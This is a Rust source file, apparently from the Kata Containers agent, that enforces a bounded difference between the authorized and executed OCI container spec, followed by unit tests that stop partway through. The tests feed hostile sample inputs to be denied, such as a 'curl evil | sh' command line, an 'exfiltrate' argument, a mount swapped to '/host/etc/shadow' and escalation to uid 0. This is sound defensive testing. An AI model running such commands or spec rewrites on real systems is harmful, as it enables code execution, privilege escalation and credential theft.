// Copyright (c) 2025 Microsoft Corporation
//
// SPDX-License-Identifier: Apache-2.0
//

//! Bounded-diff enforcement between the *authorized* plan and the *executed* plan.
//!
//! # The gap this closes
//!
//! The policy engine authorizes the OCI spec exactly as it arrives from the host.
//! Before the container is created, the agent applies a chain of in-guest
//! resolution steps (device injection, CDI, storage, sealed-secret unsealing,
//! namespace fixups, rootfs rebinding). The spec finally handed to the runtime is
//! therefore *not* the spec that was authorized.
//!
//! Without a bound on that divergence, "the policy authorized this plan" degrades
//! to "the policy authorized *some* plan": any in-guest step -- or any bug or
//! injection reachable from one -- could rewrite a security-critical field after
//! the authorization decision was taken.
//!
//! # Relationship to C-ACI / hcsshim
//!
//! hcsshim solves the same problem by *ordering*: it runs the in-guest transforms
//! first and evaluates the policy on the already-transformed spec, so
//! "authorized" and "executed" coincide by construction. This agent authorizes
//! first and transforms afterwards, so the property has to be re-established
//! explicitly -- that is what this module does.
//!
//! The classification below mirrors the boundary hcsshim actually enforces:
//!
//! * hcsshim **bans OCI hooks outright** (`checkContainerSettings` rejects a
//!   non-nil `Hooks`). We cannot ban them -- `append_guest_hooks` legitimately
//!   adds hooks from the measured guest rootfs -- so we take the nearest
//!   available position: hooks may be *added*, never removed or rewritten.
//! * hcsshim **validates the mount list** (`mountList_ok`) against the resolved
//!   in-guest paths, so an authorized mount cannot be swapped underneath it.
//!   We pin authorized mounts and permit additions.
//! * hcsshim **snapshots host-supplied `Linux.Devices` before transforms** and
//!   validates that snapshot, treating platform-injected devices as exempt.
//!   Append-only reproduces exactly that split.
//! * hcsshim does **not** verify `Linux.CgroupsPath` or the cgroup device ACL
//!   (`Linux.Resources.Devices`); those are treated as operational. We match.
//!
//! Sealed-secret expansion has no C-ACI analog (C-ACI does not substitute
//! secrets into the environment at create time), so the environment rule in
//! [`assert_env_within_bounds`] is a Kata-specific extension rather than a
//! port of an existing precedent.
//!
//! # Fail-closed by construction
//!
//! Anything not explicitly classified below must be byte-identical between the
//! authorized and executed specs. A future OCI field that nobody has classified
//! is, by construction, not permitted to change, so a spec extension cannot
//! silently widen what in-guest code may do.
//!
//! # Reporting discipline
//!
//! Violations are reported as JSON pointer **paths and indices only, never
//! values**. The executed spec contains unsealed secret material, and the error
//! surfaces to the host, which is untrusted.

use anyhow::{anyhow, Result};
use oci_spec::runtime::Spec;
use serde_json::Value;
use std::collections::BTreeSet;
use std::path::Path;

use crate::confidential_data_hub::SEALED_SECRET_PREFIX;

/// Pointers the resolution chain may replace wholesale.
///
/// | Pointer                    | Written by                            | C-ACI position |
/// |----------------------------|---------------------------------------|----------------|
/// | `/linux/namespaces`        | `update_container_namespaces`         | not enforcer-validated |
/// | `/linux/resources/devices` | `add_devices` writes cgroup device rules for the nodes it injected. Sibling `/linux/resources/*` limits (memory, cpu, pids) stay pinned. | not enforcer-validated |
///
/// `/root/path` is deliberately **not** here: it is rewritten by `setup_bundle`,
/// but to a value the guest derives itself, so it is pinned to that value rather
/// than waived. See [`ROOT_PATH_POINTER`]. `/root/readonly` is likewise absent:
/// `setup_bundle` preserves it and it is security-critical.
const RESOLUTION_REPLACEABLE_POINTERS: &[&str] = &["/linux/namespaces", "/linux/resources/devices"];

/// The container rootfs pointer.
///
/// `setup_bundle` rewrites this from the host-supplied value to the bundle
/// rootfs the guest prepared, so the authorized value cannot survive verbatim
/// and a plain equality check against `authorized` would always fail. The
/// rewrite is nonetheless *deterministic* — `CONTAINER_BASE/<cid>/rootfs` — so
/// the executed value is checked against that expected path instead of being
/// waived. This is C-ACI/hcsshim's position: it computes the expected rootfs
/// itself and rejects any spec whose root differs, so a container can only ever
/// be rooted at the one filesystem the platform prepared. Merely allowing the
/// value to change would let a compromised in-guest transform re-root the
/// container at a directory of its choosing without tripping the binding.
const ROOT_PATH_POINTER: &str = "/root/path";

/// Pointers holding arrays the resolution chain may *extend* but not disturb.
///
/// Every entry present at authorization time must still be present, unmodified,
/// and in the same relative order. New entries may be inserted anywhere.
///
/// Presence is not sufficient on its own: these arrays are applied in list
/// order, so an appended entry naming the same *target* as an authorized entry
/// takes effect instead of it while leaving the authorized entry untouched.
/// Each pointer therefore also carries the field that identifies the target,
/// whose per-value occurrence count must be preserved exactly.
///
/// | Pointer          | Target field  | Extended by                                        |
/// |------------------|---------------|----------------------------------------------------|
/// | `/mounts`        | `destination` | `add_devices`, `handle_cdi_devices`, `add_storages` |
/// | `/linux/devices` | `path`        | `add_devices`, `handle_cdi_devices`                 |
const RESOLUTION_APPEND_ONLY_POINTERS: &[(&str, &str)] =
    &[("/mounts", "destination"), ("/linux/devices", "path")];

/// Hooks are an object of per-phase arrays, each append-only. Extended by
/// `append_guest_hooks` (measured guest rootfs) and `handle_cdi_devices`.
const HOOKS_POINTER: &str = "/hooks";

/// The environment carries a dedicated rule rather than a blanket allowance.
const ENV_POINTER: &str = "/process/env";

/// Cap on how many differing paths a single error reports, so that a spec with
/// wholesale divergence cannot produce an unbounded error string.
///
/// [`diff_paths`] deliberately collects one path *beyond* this cap: without
/// that sentinel, "exactly at the cap" and "over the cap" are indistinguishable
/// and the truncation marker could never be emitted. The extra entry is dropped
/// before the paths are rendered.
const MAX_REPORTED_PATHS: usize = 16;

/// Verify that `executed` differs from `authorized` only in ways the in-guest
/// resolution chain is permitted to produce.
///
/// `expected_root_path` is the rootfs the guest itself prepared for this
/// container; the executed plan must be rooted exactly there. The caller derives
/// it the same way `setup_bundle` does, so the two cannot drift.
///
/// Returns `Ok(())` when the divergence is within bounds. Returns an error
/// naming the offending locations otherwise; the caller must treat that as a
/// denial of the operation, not as a warning.
pub fn assert_within_resolution_bounds(
    authorized: &Spec,
    executed: &Spec,
    expected_root_path: &Path,
) -> Result<()> {
    assert_root_path_pinned(executed, expected_root_path)?;

    let mut want = serde_json::to_value(authorized)
        .map_err(|e| anyhow!("plan binding: cannot serialize authorized spec: {e}"))?;
    let mut got = serde_json::to_value(executed)
        .map_err(|e| anyhow!("plan binding: cannot serialize executed spec: {e}"))?;

    // Fields with their own rules are lifted out of the structural diff and
    // checked separately, then removed from both sides so the residual
    // comparison sees only fields that must match exactly.
    assert_env_within_bounds(&take_env(&mut want), &take_env(&mut got))?;

    let want_hooks = take_at(&mut want, HOOKS_POINTER);
    let got_hooks = take_at(&mut got, HOOKS_POINTER);
    assert_hooks_within_bounds(&want_hooks, &got_hooks)?;

    for (pointer, target_field) in RESOLUTION_APPEND_ONLY_POINTERS {
        let want_items = take_array(&mut want, pointer);
        let got_items = take_array(&mut got, pointer);
        assert_append_only(&want_items, &got_items, pointer)?;
        assert_no_shadowing(&want_items, &got_items, pointer, target_field)?;
    }

    // Remove -- rather than blank -- every replaceable pointer from both sides.
    // Removal is a no-op when the pointer is absent on one side, whereas
    // blanking would turn "absent vs null" into a spurious difference.
    //
    // `/root/path` joins them only after `assert_root_path_pinned` has checked
    // it: it is verified against the expected value rather than against the
    // authorized one, so leaving it in the structural diff would fail every
    // create.
    for pointer in RESOLUTION_REPLACEABLE_POINTERS
        .iter()
        .chain(std::iter::once(&ROOT_PATH_POINTER))
    {
        remove_at(&mut want, pointer);
        remove_at(&mut got, pointer);
    }

    let mut differing = Vec::new();
    diff_paths(&want, &got, "", &mut differing);

    if differing.is_empty() {
        return Ok(());
    }

    let truncated = differing.len() > MAX_REPORTED_PATHS;
    differing.truncate(MAX_REPORTED_PATHS);
    Err(anyhow!(
        "plan binding violation: in-guest resolution modified fields outside the permitted set; \
         the executed plan is not the plan the policy authorized. Offending paths: [{}]{}",
        differing.join(", "),
        if truncated { ", ..." } else { "" }
    ))
}

/// Require that the executed plan is rooted at the filesystem the guest
/// prepared for this container, and nowhere else.
///
/// The authorized value is not consulted: it is host-supplied and is always
/// overwritten by `setup_bundle`. What matters is that the overwrite produced
/// the one value the guest derived, so that no transform running between
/// authorization and `create` can re-root the container.
fn assert_root_path_pinned(executed: &Spec, expected: &Path) -> Result<()> {
    let Some(root) = executed.root().as_ref() else {
        return Err(anyhow!(
            "plan binding violation: the executed plan has no root; the container must be \
             rooted at the rootfs the guest prepared ({})",
            expected.display()
        ));
    };

    if root.path() != expected {
        return Err(anyhow!(
            "plan binding violation: the executed plan is rooted at {} but the guest \
             prepared {}; in-guest resolution may rebind the rootfs only to the bundle \
             path the guest itself derived",
            root.path().display(),
            expected.display()
        ));
    }

    Ok(())
}

/// Require that every authorized entry survives into `got` unmodified and in
/// order, tolerating entries inserted anywhere around them.
///
/// This is the closest reachable analog of hcsshim's position for hooks (banned
/// outright), mounts (validated against the resolved list) and host-supplied
/// devices (snapshotted before transforms, then validated): whatever the policy
/// saw is still there and still says the same thing, while genuinely
/// platform-added entries remain possible.
fn assert_append_only(want: &[Value], got: &[Value], path: &str) -> Result<()> {
    let mut cursor = 0usize;

    for (index, entry) in want.iter().enumerate() {
        let offset = got[cursor..]
            .iter()
            .position(|candidate| candidate == entry)
            .ok_or_else(|| {
                anyhow!(
                    "plan binding violation: in-guest resolution removed, reordered, or rewrote \
                     the authorized entry at {path}/{index}"
                )
            })?;
        cursor += offset + 1;
    }

    Ok(())
}

/// Require that no *added* entry claims a target an authorized entry already
/// claims.
///
/// [`assert_append_only`] proves the authorized entries survived; it cannot
/// prove they still take effect. `/mounts` and `/linux/devices` are applied in
/// list order, so an entry appended after an authorized one that names the same
/// `destination` (resp. `path`) is mounted or created over it and wins at
/// runtime -- a substitution that leaves the authorized entry byte-identical
/// and in place, and so is invisible to subsequence matching.
///
/// The rule is exact occurrence-count preservation, not mere absence of
/// duplicates: an authorized array that already names a target twice keeps
/// that shape, and nothing may add or drop an occurrence of an authorized
/// target. Targets the policy never saw remain freely addable.
///
/// Errors name the target, which is a path from the host-supplied authorized
/// spec, never a value from the executed side.
fn assert_no_shadowing(want: &[Value], got: &[Value], path: &str, field: &str) -> Result<()> {
    let count = |items: &[Value], target: &str| {
        items
            .iter()
            .filter(|entry| entry.get(field).and_then(Value::as_str) == Some(target))
            .count()
    };

    for entry in want {
        let Some(target) = entry.get(field).and_then(Value::as_str) else {
            continue;
        };

        let authorized_count = count(want, target);
        let executed_count = count(got, target);
        if executed_count != authorized_count {
            return Err(anyhow!(
                "plan binding violation: in-guest resolution changed how many entries of \
                 {path} claim {field} {target:?} (authorized {authorized_count}, executed \
                 {executed_count}); an added entry would take effect instead of the \
                 authorized one"
            ));
        }
    }

    Ok(())
}

/// Apply [`assert_append_only`] to each per-phase hook array.
///
/// A phase present at authorization time may not disappear; phases absent then
/// may be introduced (that is `append_guest_hooks` adding, say, `prestart` to a
/// spec that had no hooks at all).
fn assert_hooks_within_bounds(want: &Value, got: &Value) -> Result<()> {
    let Some(want_phases) = want.as_object() else {
        // Nothing was authorized, so nothing can be violated by addition.
        return Ok(());
    };

    for (phase, want_hooks) in want_phases {
        let want_items = want_hooks.as_array().cloned().unwrap_or_default();
        let got_items = got
            .get(phase)
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();
        assert_append_only(&want_items, &got_items, &format!("{HOOKS_POINTER}/{phase}"))?;
    }

    Ok(())
}

/// The environment rule.
///
/// Two transforms legitimately touch `process.env`:
///
/// * `handle_cdi_devices` **adds** variables from the resolved CDI spec. Those
///   additions are authorized separately by the CDI resolution check, which
///   binds the resolved CDI spec to a measured digest, so admitting them here
///   does not create an unbound channel.
/// * `cdh_handler_sealed_secrets` **rewrites the value** of a variable whose
///   authorized value began with `sealed.`, replacing the reference with the
///   plaintext it denotes. The policy authorized the *reference*, and unsealing
///   is precisely the intended effect.
///
/// Everything else is a violation. Concretely:
///
/// * an authorized variable may not be **removed**,
/// * authorized variables may not be **reordered** relative to one another
///   (later duplicates win at exec time, so reordering is a value change),
/// * an authorized variable may not gain (or lose) a **duplicate definition**,
///   for the same reason: the last definition is the one that takes effect,
/// * a value may only change when the **authorized** value was a sealed
///   reference.
///
/// Matching walks a cursor forward through `executed`, so variables inserted
/// anywhere -- before, between, or after the authorized entries -- are accepted
/// while relative order is still enforced.
///
/// Errors name the variable **key** but never a value: keys come from the
/// host-supplied authorized spec and are not secret, whereas the executed
/// values may be unsealed secrets.
fn assert_env_within_bounds(authorized: &[String], executed: &[String]) -> Result<()> {
    let mut cursor = 0usize;

    for entry in authorized {
        let (key, value) = split_env(entry);

        let offset = executed[cursor..]
            .iter()
            .position(|candidate| split_env(candidate).0 == key)
            .ok_or_else(|| {
                anyhow!(
                    "plan binding violation: in-guest resolution removed or reordered the \
                     authorized environment variable {key:?}"
                )
            })?;

        let executed_value = split_env(&executed[cursor + offset]).1;
        if executed_value != value && !value.starts_with(SEALED_SECRET_PREFIX) {
            return Err(anyhow!(
                "plan binding violation: in-guest resolution rewrote the value of environment \
                 variable {key:?}, which the policy did not authorize as a sealed reference"
            ));
        }

        cursor += offset + 1;
    }

    // Surviving in place is not the same as still taking effect. `set_var` is
    // applied in list order, so a *duplicate* of an authorized key appended
    // after it silently replaces its value while leaving the authorized entry
    // byte-identical and correctly ordered -- invisible to the cursor walk
    // above, which only inspects entries it consumes. Reordering is denied
    // precisely because later duplicates win; permitting the duplicate itself
    // would leave the easier route open.
    //
    // Exact occurrence-count preservation, so an authorized spec that already
    // repeats a key keeps that shape. Keys the policy never saw stay freely
    // addable.
    for entry in authorized {
        let key = split_env(entry).0;
        let count = |entries: &[String]| {
            entries
                .iter()
                .filter(|candidate| split_env(candidate).0 == key)
                .count()
        };

        let authorized_count = count(authorized);
        let executed_count = count(executed);
        if executed_count != authorized_count {
            return Err(anyhow!(
                "plan binding violation: in-guest resolution changed how many times the \
                 authorized environment variable {key:?} is defined (authorized \
                 {authorized_count}, executed {executed_count}); a duplicate definition \
                 would override the authorized value"
            ));
        }
    }

    Ok(())
}

/// Split an OCI environment entry into its key and value halves. An entry with
/// no `=` is treated as a key with an empty value, matching how the runtime and
/// the unsealing path interpret it.
fn split_env(entry: &str) -> (&str, &str) {
    match entry.split_once('=') {
        Some((key, value)) => (key, value),
        None => (entry, ""),
    }
}

/// Remove `/process/env` from `spec` and return it as a list of strings.
fn take_env(spec: &mut Value) -> Vec<String> {
    let env = spec
        .pointer(ENV_POINTER)
        .and_then(Value::as_array)
        .map(|entries| {
            entries
                .iter()
                .map(|entry| entry.as_str().unwrap_or_default().to_string())
                .collect()
        })
        .unwrap_or_default();
    remove_at(spec, ENV_POINTER);
    env
}

/// Remove the node at `pointer` and return it, or `Value::Null` when absent.
fn take_at(spec: &mut Value, pointer: &str) -> Value {
    let taken = spec.pointer(pointer).cloned().unwrap_or(Value::Null);
    remove_at(spec, pointer);
    taken
}

/// Remove the array at `pointer` and return its items, or an empty list.
fn take_array(spec: &mut Value, pointer: &str) -> Vec<Value> {
    match take_at(spec, pointer) {
        Value::Array(items) => items,
        _ => Vec::new(),
    }
}

/// Remove the node at RFC 6901 `pointer`, then prune any ancestor that the
/// removal left empty.
///
/// Pruning matters because a classified pointer can be the sole occupant of its
/// parent: `add_devices` may create `linux.resources` purely to hold the device
/// rules it injected. Removing `/linux/resources/devices` would then leave `{}`
/// on one side and nothing on the other -- a difference in JSON but not in
/// meaning. Only ancestors *along the removed path* are pruned, and only when
/// they are empty, so this cannot mask a real change.
fn remove_at(root: &mut Value, pointer: &str) {
    let mut segments: Vec<&str> = pointer.split('/').skip(1).collect();

    while let Some(last) = segments.pop() {
        let parent_pointer = if segments.is_empty() {
            String::new()
        } else {
            format!("/{}", segments.join("/"))
        };

        let Some(parent) = root.pointer_mut(&parent_pointer) else {
            return;
        };

        match parent {
            Value::Object(map) => {
                // RFC 6901 escaping: `~1` decodes to `/` and must be undone
                // before `~0` decodes to `~`.
                let key = last.replace("~1", "/").replace("~0", "~");
                map.remove(&key);
                if !map.is_empty() {
                    return;
                }
            }
            Value::Array(items) => {
                match last.parse::<usize>() {
                    Ok(index) if index < items.len() => {
                        items.remove(index);
                    }
                    _ => return,
                }
                if !items.is_empty() {
                    return;
                }
            }
            _ => return,
        }

        // The parent is now empty; loop round to remove it from *its* parent.
    }
}

/// Collect the JSON pointer paths at which `want` and `got` differ.
///
/// Values are never recorded -- only the paths -- because this feeds an error
/// returned to the untrusted host.
///
/// Collection stops at `MAX_REPORTED_PATHS + 1` entries so that the caller can
/// tell a diff that exactly fills the cap from one that overflows it.
fn diff_paths(want: &Value, got: &Value, base: &str, out: &mut Vec<String>) {
    if out.len() > MAX_REPORTED_PATHS {
        return;
    }

    match (want, got) {
        (Value::Object(want_map), Value::Object(got_map)) => {
            let keys: BTreeSet<&String> = want_map.keys().chain(got_map.keys()).collect();
            for key in keys {
                let escaped = key.replace('~', "~0").replace('/', "~1");
                let child = format!("{base}/{escaped}");
                match (want_map.get(key), got_map.get(key)) {
                    (Some(w), Some(g)) => diff_paths(w, g, &child, out),
                    _ => out.push(child),
                }
                if out.len() > MAX_REPORTED_PATHS {
                    return;
                }
            }
        }
        (Value::Array(want_items), Value::Array(got_items)) => {
            if want_items.len() != got_items.len() {
                out.push(format!("{base}[]"));
                return;
            }
            for (index, (w, g)) in want_items.iter().zip(got_items).enumerate() {
                diff_paths(w, g, &format!("{base}/{index}"), out);
                if out.len() > MAX_REPORTED_PATHS {
                    return;
                }
            }
        }
        _ => {
            if want != got {
                out.push(if base.is_empty() {
                    "/".to_string()
                } else {
                    base.to_string()
                });
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn spec_from(value: Value) -> Spec {
        serde_json::from_value(value).expect("test spec should deserialize")
    }

    /// A spec exercising every field class the classification reasons about.
    fn baseline() -> Value {
        json!({
            "ociVersion": "1.0.2",
            "hostname": "authorized-host",
            "root": { "path": "/run/kata/rootfs", "readonly": true },
            "mounts": [
                { "destination": "/proc", "type": "proc", "source": "proc" },
                { "destination": "/data", "type": "bind", "source": "/host/data" }
            ],
            "hooks": {
                "prestart": [{ "path": "/usr/bin/authorized-hook" }]
            },
            "annotations": { "io.katacontainers.pkg.oci.container_type": "pod_container" },
            "process": {
                "args": ["/bin/sh", "-c", "echo hello"],
                "cwd": "/",
                "noNewPrivileges": true,
                "user": { "uid": 1000, "gid": 1000 },
                "env": ["PATH=/usr/bin", "TOKEN=sealed.fakeref", "MODE=strict"],
                "capabilities": { "effective": ["CAP_CHOWN"] }
            },
            "linux": {
                "devices": [{ "path": "/dev/fuse", "type": "c", "major": 10, "minor": 229 }],
                "namespaces": [{ "type": "pid" }],
                "maskedPaths": ["/proc/kcore"],
                "readonlyPaths": ["/proc/sys"],
                "sysctl": { "net.ipv4.ip_forward": "0" },
                "resources": { "memory": { "limit": 1073741824 } }
            }
        })
    }

    /// The rootfs the guest is taken to have prepared for the baseline spec.
    const EXPECTED_ROOT: &str = "/run/kata/rootfs";

    fn check(mutate: impl FnOnce(&mut Value)) -> Result<()> {
        let authorized = baseline();
        let mut executed = baseline();
        mutate(&mut executed);
        assert_within_resolution_bounds(
            &spec_from(authorized),
            &spec_from(executed),
            Path::new(EXPECTED_ROOT),
        )
    }

    fn assert_allowed(mutate: impl FnOnce(&mut Value)) {
        check(mutate).expect("mutation should be within resolution bounds");
    }

    fn assert_denied(expected_fragment: &str, mutate: impl FnOnce(&mut Value)) {
        let rendered = check(mutate)
            .expect_err("mutation should be denied")
            .to_string();
        assert!(
            rendered.contains(expected_fragment),
            "error {:?} should mention {:?}",
            rendered,
            expected_fragment
        );
    }

    #[test]
    fn identical_specs_are_within_bounds() {
        assert_allowed(|_| {});
    }

    #[test]
    fn replaceable_fields_may_be_rewritten() {
        // update_container_namespaces rewrites namespaces.
        assert_allowed(|spec| spec["linux"]["namespaces"] = json!([{ "type": "ipc" }]));
        // add_devices writes cgroup device rules beside an existing memory limit.
        assert_allowed(|spec| {
            spec["linux"]["resources"]["devices"] =
                json!([{ "allow": true, "type": "c", "major": 195, "minor": 0 }]);
        });
    }

    #[test]
    fn root_path_must_equal_the_rootfs_the_guest_prepared() {
        // setup_bundle rebinds the rootfs, but only ever to the path the guest
        // itself derived; anything else re-roots the container.
        assert_denied("is rooted at", |spec| {
            spec["root"]["path"] = json!("/run/kata/bundles/abc/rootfs")
        });
    }

    #[test]
    fn root_path_matching_the_expected_rootfs_is_within_bounds() {
        let authorized = baseline();
        let mut executed = baseline();
        executed["root"]["path"] = json!("/run/kata/containers/abc/rootfs");
        assert_within_resolution_bounds(
            &spec_from(authorized),
            &spec_from(executed),
            Path::new("/run/kata/containers/abc/rootfs"),
        )
        .expect("a plan rooted at the prepared rootfs is within bounds");
    }

    #[test]
    fn executed_plan_without_a_root_is_denied() {
        let authorized = baseline();
        let mut executed = baseline();
        executed.as_object_mut().unwrap().remove("root");
        let rendered = assert_within_resolution_bounds(
            &spec_from(authorized),
            &spec_from(executed),
            Path::new(EXPECTED_ROOT),
        )
        .expect_err("a rootless executed plan should be denied")
        .to_string();
        assert!(
            rendered.contains("has no root"),
            "error {:?} should mention the missing root",
            rendered
        );
    }

    #[test]
    fn append_only_fields_accept_additions_anywhere() {
        assert_allowed(|spec| {
            // A storage mount inserted before, and a device mount after, the
            // authorized entries.
            spec["mounts"] = json!([
                { "destination": "/run/kata/storage", "type": "bind", "source": "/dev/sdb" },
                { "destination": "/proc", "type": "proc", "source": "proc" },
                { "destination": "/data", "type": "bind", "source": "/host/data" },
                { "destination": "/dev/shm", "type": "tmpfs", "source": "shm" }
            ]);
            spec["linux"]["devices"] = json!([
                { "path": "/dev/fuse", "type": "c", "major": 10, "minor": 229 },
                { "path": "/dev/nvidia0", "type": "c", "major": 195, "minor": 0 }
            ]);
            spec["hooks"]["prestart"] = json!([
                { "path": "/usr/bin/authorized-hook" },
                { "path": "/usr/bin/guest-hook" }
            ]);
        });
    }

    #[test]
    fn a_hook_phase_absent_at_authorization_may_be_introduced() {
        // append_guest_hooks adding a phase the host never supplied.
        assert_allowed(|spec| {
            spec["hooks"]["poststop"] = json!([{ "path": "/usr/bin/guest-cleanup" }]);
        });
    }

    #[test]
    fn rewriting_an_authorized_mount_is_denied() {
        // The most dangerous append-only violation: swapping the source of a
        // mount the policy already approved.
        assert_denied("/mounts/1", |spec| {
            spec["mounts"][1]["source"] = json!("/host/etc/shadow");
        });
    }

    #[test]
    fn removing_or_reordering_authorized_entries_is_denied() {
        assert_denied("/mounts/1", |spec| {
            spec["mounts"] = json!([{ "destination": "/proc", "type": "proc", "source": "proc" }]);
        });
        // Subsequence matching reports the first authorized entry that can no
        // longer be matched in order, which for a swap is the *second* one:
        // `/proc` still matches (at its new index) and `/data` then has nothing
        // left to match against.
        assert_denied("/mounts/1", |spec| {
            spec["mounts"] = json!([
                { "destination": "/data", "type": "bind", "source": "/host/data" },
                { "destination": "/proc", "type": "proc", "source": "proc" }
            ]);
        });
        assert_denied("/linux/devices/0", |spec| {
            spec["linux"]["devices"] = json!([]);
        });
    }

    #[test]
    fn appending_a_mount_that_shadows_an_authorized_destination_is_denied() {
        // The authorized `/data` mount survives untouched and in order, so
        // subsequence matching alone accepts this. Mounts are applied in list
        // order, so the appended entry is what `/data` actually resolves to.
        assert_denied("\"/data\"", |spec| {
            spec["mounts"]
                .as_array_mut()
                .expect("baseline has mounts")
                .push(json!({ "destination": "/data", "type": "bind", "source": "/host/etc" }));
        });
    }

    #[test]
    fn appending_a_device_that_shadows_an_authorized_path_is_denied() {
        assert_denied("\"/dev/fuse\"", |spec| {
            let path = spec["linux"]["devices"][0]["path"].clone();
            spec["linux"]["devices"]
                .as_array_mut()
                .expect("baseline has devices")
                .push(json!({ "path": path, "type": "c", "major": 1, "minor": 3 }));
        });
    }

    #[test]
    fn rewriting_or_dropping_an_authorized_hook_is_denied() {
        assert_denied("/hooks/prestart/0", |spec| {
            spec["hooks"]["prestart"] = json!([{ "path": "/usr/bin/attacker-hook" }]);
        });
        assert_denied("/hooks/prestart/0", |spec| spec["hooks"] = json!({}));
    }

    #[test]
    fn security_critical_fields_are_pinned() {
        assert_denied("/process/args", |spec| {
            spec["process"]["args"] = json!(["/bin/sh", "-c", "curl evil | sh"]);
        });
        assert_denied("/process/user/uid", |spec| {
            spec["process"]["user"]["uid"] = json!(0);
        });
        assert_denied("/process/noNewPrivileges", |spec| {
            spec["process"]["noNewPrivileges"] = json!(false);
        });
        assert_denied("/process/capabilities", |spec| {
            spec["process"]["capabilities"]["effective"] = json!(["CAP_SYS_ADMIN"]);
        });
        assert_denied("/root/readonly", |spec| {
            spec["root"]["readonly"] = json!(false);
        });
        assert_denied("/hostname", |spec| spec["hostname"] = json!("evil-host"));
        assert_denied("/linux/maskedPaths", |spec| {
            spec["linux"]["maskedPaths"] = json!([]);
        });
        assert_denied("/linux/readonlyPaths", |spec| {
            spec["linux"]["readonlyPaths"] = json!([]);
        });
        assert_denied("/linux/sysctl", |spec| {
            spec["linux"]["sysctl"]["net.ipv4.ip_forward"] = json!("1");
        });
        assert_denied("/annotations", |spec| {
            spec["annotations"]["io.katacontainers.pkg.oci.container_type"] = json!("pod_sandbox");
        });
    }

    #[test]
    fn sibling_cgroup_limits_are_not_covered_by_the_device_allowance() {
        assert_denied("/linux/resources/memory/limit", |spec| {
            spec["linux"]["resources"]["devices"] = json!([{ "allow": false }]);
            spec["linux"]["resources"]["memory"]["limit"] = json!(0);
        });
    }

    #[test]
    fn env_additions_are_accepted() {
        // CDI injects variables; their provenance is bound by the CDI
        // resolution check, and insertion position must not matter.
        assert_allowed(|spec| {
            spec["process"]["env"] = json!([
                "NVIDIA_VISIBLE_DEVICES=all",
                "PATH=/usr/bin",
                "TOKEN=sealed.fakeref",
                "LD_PRELOAD=/usr/lib/cdi.so",
                "MODE=strict",
                "TRAILING=1"
            ]);
        });
    }

    #[test]
    fn unsealing_a_sealed_reference_is_accepted() {
        assert_allowed(|spec| {
            spec["process"]["env"] = json!([
                "PATH=/usr/bin",
                "TOKEN=actual-plaintext-secret",
                "MODE=strict"
            ]);
        });
    }

    #[test]
    fn rewriting_a_non_sealed_value_is_denied() {
        assert_denied("\"MODE\"", |spec| {
            spec["process"]["env"] = json!(["PATH=/usr/bin", "TOKEN=sealed.fakeref", "MODE=off"]);
        });
    }

    #[test]
    fn removing_an_authorized_variable_is_denied() {
        assert_denied("\"MODE\"", |spec| {
            spec["process"]["env"] = json!(["PATH=/usr/bin", "TOKEN=sealed.fakeref"]);
        });
    }

    #[test]
    fn reordering_authorized_variables_is_denied() {
        // Later duplicates win at exec time, so order is semantically load-bearing.
        // Moving TOKEN past MODE is reported against MODE: TOKEN still matches at
        // its new position, leaving MODE with nothing after it to match.
        assert_denied("\"MODE\"", |spec| {
            spec["process"]["env"] =
                json!(["PATH=/usr/bin", "MODE=strict", "TOKEN=sealed.fakeref"]);
        });
    }

    #[test]
    fn appending_a_duplicate_of_an_authorized_variable_is_denied() {
        // The authorized MODE=strict entry is untouched and in order, so the
        // ordered walk accepts it -- but `set_var` is applied in list order, so
        // the trailing duplicate is the value the process actually sees.
        assert_denied("\"MODE\"", |spec| {
            spec["process"]["env"] = json!([
                "PATH=/usr/bin",
                "TOKEN=sealed.fakeref",
                "MODE=strict",
                "MODE=off"
            ]);
        });
    }

    #[test]
    fn env_violations_never_disclose_values() {
        let authorized = spec_from(baseline());
        let mut mutated = baseline();
        // A genuine unsealed secret sits in the same list as the violation.
        mutated["process"]["env"] =
            json!(["PATH=/usr/bin", "TOKEN=super-secret-plaintext", "MODE=off"]);

        let rendered = assert_within_resolution_bounds(
            &authorized,
            &spec_from(mutated),
            Path::new(EXPECTED_ROOT),
        )
        .expect_err("value rewrite should be denied")
        .to_string();
        assert!(
            !rendered.contains("super-secret-plaintext"),
            "error must not disclose environment values: {}",
            rendered
        );
        assert!(
            !rendered.contains("off"),
            "error must not disclose values: {}",
            rendered
        );
    }

    #[test]
    fn structural_violations_never_disclose_values() {
        let authorized = spec_from(baseline());
        let mut mutated = baseline();
        mutated["process"]["args"] = json!(["/bin/sh", "-c", "exfiltrate --key=hunter2"]);

        let rendered = assert_within_resolution_bounds(
            &authorized,
            &spec_from(mutated),
            Path::new(EXPECTED_ROOT),
        )
        .expect_err("args rewrite should be denied")
        .to_string();
        assert!(
            !rendered.contains("hunter2"),
            "error must not disclose field values: {}",
            rendered
        );
    }

    #[test]
    fn append_only_violations_never_disclose_values() {
        let rendered = check(|spec| spec["mounts"][1]["source"] = json!("/host/etc/shadow"))
            .expect_err("mount rewrite should be denied")
            .to_string();
        assert!(
            !rendered.contains("shadow"),
            "error must not disclose mount values: {}",
            rendered
        );
    }

    #[test]
    fn reported_paths_are_capped() {
        let authorized = spec_from(baseline());
        let mut mutated = baseline();
        let sysctl = mutated["linux"]["sysctl"].as_object_mut().unwrap();
        for index in 0..(MAX_REPORTED_PATHS * 3) {
            sysctl.insert(format!("net.custom.key{index}"), json!("1"));
        }

        let rendered = assert_within_resolution_bounds(
            &authorized,
            &spec_from(mutated),
            Path::new(EXPECTED_ROOT),
        )
        .expect_err("sysctl additions should be denied")
        .to_string();
        assert!(
            rendered.ends_with(", ..."),
            "expected truncation marker: {}",
            rendered
        );
        assert!(
            rendered.matches("/linux/sysctl/").count() <= MAX_REPORTED_PATHS,
            "reported paths should be capped: {}",
            rendered
        );
    }

    #[test]
    fn empty_ancestors_left_by_removal_do_not_register_as_differences() {
        // The authorized spec has no linux.resources at all; resolution creates
        // it solely to hold injected device rules.
        let mut authorized = baseline();
        authorized["linux"]
            .as_object_mut()
            .unwrap()
            .remove("resources");
        let mut executed = authorized.clone();
        executed["linux"]["resources"]["devices"] =
            json!([{ "allow": true, "type": "c", "major": 10, "minor": 200 }]);

        assert_within_resolution_bounds(
            &spec_from(authorized),
            &spec_from(executed),
            Path::new(EXPECTED_ROOT),
        )
        .expect("device-only resources should be within bounds");
    }

    #[test]
    fn a_spec_with_no_optional_sections_is_handled() {
        let minimal = json!({
            "ociVersion": "1.0.2",
